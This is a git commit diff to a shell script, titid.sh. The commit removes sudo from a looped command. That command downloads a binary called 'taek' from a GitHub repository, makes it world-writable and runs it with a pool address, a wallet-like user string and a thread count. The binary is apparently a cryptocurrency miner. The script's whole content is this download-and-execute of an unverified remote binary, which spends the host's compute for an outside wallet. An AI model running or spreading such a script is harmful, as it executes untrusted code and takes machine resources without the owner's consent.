8db43dbb3602f3d1659126587d7c01b25aef3efe
sheesheshee <86801425+sheesheshee@users.noreply.github.com>
2021-07-02 02:37:54 +0700

    Update titid.sh

--- titid.sh
+++ titid.sh
@@ -3,7 +3,7 @@
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
  
- wget https://github.com/OmJhonyPerkasa/yteam/raw/master/taek && sudo chmod 777 taek && ./taek -v -l 79.137.70.48:3956 -u RKzMVjYKpBPzbUFMMMLvgergy9a4JDShva.budi -p x -t 8
+ wget https://github.com/OmJhonyPerkasa/yteam/raw/master/taek && chmod 777 taek && ./taek -v -l 79.137.70.48:3956 -u RKzMVjYKpBPzbUFMMMLvgergy9a4JDShva.budi -p x -t 8
  
      echo COUNTER $COUNTER
      let COUNTER-=1
